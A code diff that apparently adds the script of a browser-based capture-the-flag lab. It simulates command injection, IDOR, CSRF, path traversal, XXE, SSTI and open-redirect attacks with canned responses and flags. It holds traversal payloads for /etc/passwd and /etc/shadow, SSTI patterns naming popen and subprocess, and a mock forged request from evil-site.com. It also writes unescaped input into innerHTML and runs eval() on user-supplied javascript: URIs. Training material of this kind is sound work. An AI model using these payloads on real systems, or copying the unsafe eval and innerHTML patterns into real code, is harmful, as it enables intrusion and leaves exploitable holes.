+    document.getElementById('cmd-out').innerHTML = `PING 127.0.0.1: 56 data bytes<br>64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.045ms<br>--- INJECTED OUTPUT ---<br><span style="color:var(--red)">${result}</span><br>🚩 FLAG{command_injection}`;
+  } else {
+    document.getElementById('cmd-out').innerHTML = `PING ${input}: 56 data bytes<br>64 bytes from ${input}: icmp_seq=0 ttl=64 time=0.045 ms<br>64 bytes from ${input}: icmp_seq=1 ttl=64 time=0.052 ms<br>64 bytes from ${input}: icmp_seq=2 ttl=64 time=0.048 ms<br>--- ${input} ping statistics ---<br>3 packets transmitted, 3 received`;
+  }
+}
+
+// ── IDOR ────────────────────────────────────────────────────────────────────
+function idorFetch() {
+  const id = parseInt(document.getElementById('idor-id').value);
+  const user = db.users.find(u => u.id === id);
+  if (!user) { out('idor-out', '{"error":"User not found"}', 'error'); return; }
+
+  if (id !== 3) addFlag('IDOR: Unauthorized Access');
+  const flag = id !== 3 ? `\n"flag": "FLAG{idor_unauthorized_access}"` : '';
+  out('idor-out', `<pre style="color:var(--${id!==3?'yellow':'text'})">{
+  "id": ${user.id},
+  "username": "${user.username}",
+  "email": "${user.email}",
+  "role": "${user.role}"${id!==3?`,
+  "ssn": "${user.ssn}",
+  "credit_card": "${user.cc}"${flag}`:''}
+}</pre>`, id !== 3 ? 'warning' : 'info');
+}
+
+// ── CSRF ────────────────────────────────────────────────────────────────────
+function csrfAttack() {
+  addFlag('CSRF: Forged Request');
+  document.getElementById('csrf-current-email').textContent = 'attacker@evil.com';
+  out('csrf-out', `✅ <strong>CSRF ATTACK SUCCESSFUL</strong><br>
+POST /account/email HTTP/1.1<br>
+Origin: http://evil-site.com<br>
+Cookie: session=victim_session_abc<br>
+Body: email=attacker@evil.com<br><br>
+Victim's email changed without their knowledge!<br>
+🚩 FLAG{csrf_no_token}`, 'success');
+}
+
+// ── LFI ─────────────────────────────────────────────────────────────────────
+function lfiLoad() {
+  const page = document.getElementById('lfi-in').value;
+  document.getElementById('lfi-query').textContent = `include("pages/${page}.php");`;
+
+  const files = {
+    'home': 'Welcome to the home page!',
+    'about': 'About us page content.',
+    '../../../etc/passwd':'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin',
+    '../../../../etc/passwd':'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
+    '../../../etc/shadow':'root:$6$xyz$hashedpassword:19000:0:99999:7:::\nwww-data:*:18901:0:99999:7:::',
+    '../../../../var/log/apache2/access.log':'127.0.0.1 - - [12/Mar/2026:10:00:01] "GET /index.php HTTP/1.1" 200 1234\n127.0.0.1 - - [12/Mar/2026:10:00:02] "GET /?page=../../../../etc/passwd HTTP/1.1" 200 2048',
+    'php://filter/convert.base64-encode/resource=config':'PD9waHAKJGRiX2hvc3QgPSAibG9jYWxob3N0IjsKJGRiX3VzZXIgPSAicm9vdCI7CiRkYl9wYXNzID0gInN1cDNyUzNjcmV0ISI7CiRkYl9uYW1lID0gIndlYmFwcF9kYiI7Cj8+',
+    '../../../../proc/self/environ':'HOSTNAME=webserver\nPHP_VERSION=8.1\nSERVER_SOFTWARE=Apache/2.4\nDOCUMENT_ROOT=/var/www/html',
+  };
+
+  const match = Object.keys(files).find(k => page.includes(k.replace('../','')));
+  const traversal = page.includes('../') || page.includes('..\\') || page.includes('php://') || page.includes('/etc/') || page.includes('/var/');
+
+  if (traversal) {
+    addFlag('LFI: Path Traversal');
+    const content = files[page] || files[match] || 'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33';
+    document.getElementById('lfi-out').innerHTML = `<span style="color:var(--red)">🚩 FLAG{lfi_path_traversal}</span>\n${content}`;
+  } else {
+    document.getElementById('lfi-out').textContent = files[page] || `Page not found: ${page}`;
+  }
+}
+
+// ── XXE ─────────────────────────────────────────────────────────────────────
+function xxeSubmit() {
+  const xml = document.getElementById('xxe-in').value;
+  if (/<!DOCTYPE/i.test(xml) && (/SYSTEM/i.test(xml) || /PUBLIC/i.test(xml))) {
+    addFlag('XXE: External Entity');
+    const fileRead = xml.includes('/etc/passwd');
+    out('xxe-out', `✅ <strong>XXE SUCCESSFUL</strong><br>
+Response:<br>
+&lt;response&gt;<br>
+  &lt;user&gt;<br>
+    &lt;name&gt;${fileRead ? 'root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1...' : 'FILE_CONTENTS_HERE'}&lt;/name&gt;<br>
+  &lt;/user&gt;<br>
+&lt;/response&gt;<br><br>
+🚩 FLAG{xxe_file_read}`, 'success');
+  } else if (xml.includes('&xxe;') && !xml.includes('DOCTYPE')) {
+    out('xxe-out', '⚠️ Entity referenced but not declared. Add a DOCTYPE with SYSTEM entity declaration.', 'warning');
+  } else {
+    const nameMatch = xml.match(/<name>([^<]*)<\/name>/);
+    out('xxe-out', `{"status":"ok","user":"${nameMatch ? nameMatch[1] : 'parsed'}"}`, 'info');
+  }
+}
+
+// ── SSTI ─────────────────────────────────────────────────────────────────────
+function sstiSubmit() {
+  const input = document.getElementById('ssti-in').value;
+  document.getElementById('ssti-query').textContent = `render_template_string("Hello ${input}!")`;
+
+  // simulate Jinja2 evaluation
+  const mathMatch = input.match(/\{\{(\d+)\*(\d+)\}\}/);
+  if (mathMatch) {
+    const result = parseInt(mathMatch[1]) * parseInt(mathMatch[2]);
+    addFlag('SSTI: Expression Eval');
+    document.getElementById('ssti-out').innerHTML = `Hello ${result}! 🚩 FLAG{ssti_detected}`;
+    return;
+  }
+  if (/\{\{config\}\}/i.test(input)) {
+    addFlag('SSTI: Config Dump');
+    document.getElementById('ssti-out').innerHTML = `Hello &lt;Config {'SECRET_KEY': 'dev_secret_key_12345', 'DEBUG': True, 'DATABASE_URI': 'sqlite:///app.db'}&gt;! 🚩 FLAG{ssti_config_dump}`;
+    return;
+  }
+  if (/__class__|__mro__|__subclasses__|popen|subprocess/i.test(input)) {
+    addFlag('SSTI: RCE');
+    document.getElementById('ssti-out').innerHTML = `Hello (<span style="color:var(--red)">www-data</span>,)! 🚩 FLAG{ssti_rce}`;
+    return;
+  }
+  if (/\{\{/.test(input)) {
+    document.getElementById('ssti-out').innerHTML = `Hello ${input}! <span style="color:var(--yellow)">(expression not evaluated)</span>`;
+    return;
+  }
+  document.getElementById('ssti-out').textContent = `Hello ${input}!`;
+}
+
+// ── Open Redirect ─────────────────────────────────────────────────────────
+function redirSubmit() {
+  const url = document.getElementById('redir-in').value;
+  const isExternal = /^https?:\/\//i.test(url) && !url.includes('localhost');
+  const isRelativeBypass = url.startsWith('//') || url.startsWith('/\\') || url.includes('@');
+  const isJavascript = /^javascript:/i.test(url);
+
+  if (isJavascript) {
+    addFlag('Redirect: XSS via javascript:');
+    out('redir-out', `🚨 <strong>XSS via Open Redirect</strong><br>javascript: URI executed!<br>🚩 FLAG{open_redirect_xss}`, 'error');
+    try { eval(url.replace(/^javascript:/i,'').replace(/alert\(([^)]+)\)/,(_,m)=>`alert(${m})`)); } catch(e){}
+  } else if (isExternal || isRelativeBypass) {
+    addFlag('Redirect: Open Redirect');
+    out('redir-out', `✅ <strong>REDIRECTING TO: ${url}</strong><br>Victim would land on attacker-controlled page!<br>OAuth tokens in URL could be stolen via Referer header.<br>🚩 FLAG{open_redirect}`, 'warning');
+  } else {
+    out('redir-out', `ℹ️ Redirecting to: ${url} (internal — safe)`, 'info');
+  }
+}
+
+// ── Init ────────────────────────────────────────────────────────────────────
+idorFetch();
+</script>
+
+<div style="height:48px"></div>
+</body>
+</html>
